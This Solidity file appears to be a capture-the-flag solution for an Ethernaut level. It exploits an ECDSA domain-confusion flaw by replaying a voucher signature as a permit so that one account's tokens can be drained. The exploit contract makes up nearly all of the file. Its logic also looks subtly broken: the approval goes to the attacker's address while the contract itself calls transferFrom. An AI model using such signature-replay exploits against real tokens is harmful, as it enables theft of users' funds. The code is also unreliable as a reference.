// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title EllipticTokenAttack
 * @notice Solution contract for Ethernaut Level 35: Elliptic Token
 *
 * VULNERABILITY: Domain Confusion in ECDSA Signature Verification
 *
 * The permit() function uses bytes32(amount) directly as the message for ECDSA.recover()
 * instead of a proper hash. This creates a domain confusion vulnerability where:
 *
 * 1. In redeemVoucher(): ALICE signs voucherHash = keccak256(amount, receiver, salt)
 * 2. In permit(): tokenOwner = ECDSA.recover(bytes32(amount), tokenOwnerSignature)
 *
 * EXPLOIT:
 * If we set amount = uint256(voucherHash), then bytes32(amount) = voucherHash
 * This means ALICE's voucher signature will verify as a valid permit signature!
 *
 * ATTACK STEPS:
 * 1. Observe ALICE's redeemVoucher transaction
 * 2. Extract voucherHash, amount, receiver (ALICE), salt, and ALICE's signature
 * 3. Call permit(uint256(voucherHash), attacker, aliceVoucherSignature, attackerSignature)
 * 4. This approves attacker to spend ALICE's tokens (amount = voucherHash = huge number!)
 * 5. Call transferFrom(ALICE, attacker, aliceBalance) to steal all tokens
 */

interface IEllipticToken is IERC20 {
    function redeemVoucher(
        uint256 amount,
        address receiver,
        bytes32 salt,
        bytes memory ownerSignature,
        bytes memory receiverSignature
    ) external;

    function permit(
        uint256 amount,
        address spender,
        bytes memory tokenOwnerSignature,
        bytes memory spenderSignature
    ) external;

    function usedHashes(bytes32 hash) external view returns (bool);
    function owner() external view returns (address);
}

contract EllipticTokenAttack {
    IEllipticToken public immutable token;
    address public immutable attacker;

    // ALICE's address as specified in the challenge
    address public constant ALICE = 0xA11CE84AcB91Ac59B0A4E2945C9157eF3Ab17D4e;

    event AttackStarted(address attacker, address alice, uint256 aliceBalance);
    event PermitExploited(uint256 fakeAmount, address spender);
    event TokensStolen(uint256 amount);
    event AttackCompleted(uint256 attackerBalance);

    constructor(address token_) {
        token = IEllipticToken(token_);
        attacker = msg.sender;
    }

    /**
     * @notice Execute the domain confusion attack
     * @param voucherAmount The original amount from ALICE's voucher redemption
     * @param salt The salt used in ALICE's voucher
     * @param aliceVoucherSignature ALICE's signature from the voucher redemption
     * @param attackerPermitSignature Attacker's signature accepting the permit
     */
    function attack(
        uint256 voucherAmount,
        bytes32 salt,
        bytes memory aliceVoucherSignature,
        bytes memory attackerPermitSignature
    ) external {
        require(msg.sender == attacker, "Only attacker");

        uint256 aliceBalance = token.balanceOf(ALICE);
        emit AttackStarted(attacker, ALICE, aliceBalance);

        require(aliceBalance > 0, "ALICE has no tokens");

        // Step 1: Compute the voucherHash that ALICE signed
        // voucherHash = keccak256(abi.encodePacked(amount, receiver, salt))
        bytes32 voucherHash = keccak256(abi.encodePacked(voucherAmount, ALICE, salt));

        // Step 2: Call permit with amount = uint256(voucherHash)
        // This makes bytes32(amount) == voucherHash
        // So ALICE's voucher signature will verify as the tokenOwner signature!
        uint256 fakeAmount = uint256(voucherHash);
        
        emit PermitExploited(fakeAmount, attacker);

        // The permit will:
        // - Recover ALICE from ECDSA.recover(bytes32(fakeAmount), aliceVoucherSignature)
        // - Since bytes32(fakeAmount) == voucherHash, ALICE's signature verifies!
        // - Approve attacker to spend ALICE's tokens
        token.permit(fakeAmount, attacker, aliceVoucherSignature, attackerPermitSignature);

        // Step 3: Steal all of ALICE's tokens
        token.transferFrom(ALICE, attacker, aliceBalance);
        
        emit TokensStolen(aliceBalance);

        // Transfer stolen tokens to the actual attacker
        uint256 stolenBalance = token.balanceOf(address(this));
        if (stolenBalance > 0) {
            token.transfer(msg.sender, stolenBalance);
        }

        emit AttackCompleted(token.balanceOf(msg.sender));
    }

    /**
     * @notice Compute the voucher hash for verification
     */
    function computeVoucherHash(
        uint256 amount,
        address receiver,
        bytes32 salt
    ) external pure returns (bytes32) {
        return keccak256(abi.encodePacked(amount, receiver, salt));
    }

    /**
     * @notice Compute the permit accept hash that the spender needs to sign
     */
    function computePermitAcceptHash(
        address tokenOwner,
        address spender,
        uint256 amount
    ) external pure returns (bytes32) {
        return keccak256(abi.encodePacked(tokenOwner, spender, amount));
    }

    /**
     * @notice Check if the attack can succeed
     */
    function canAttackSucceed() external view returns (bool hasTokens, uint256 aliceBalance) {
        aliceBalance = token.balanceOf(ALICE);
        hasTokens = aliceBalance > 0;
    }
}
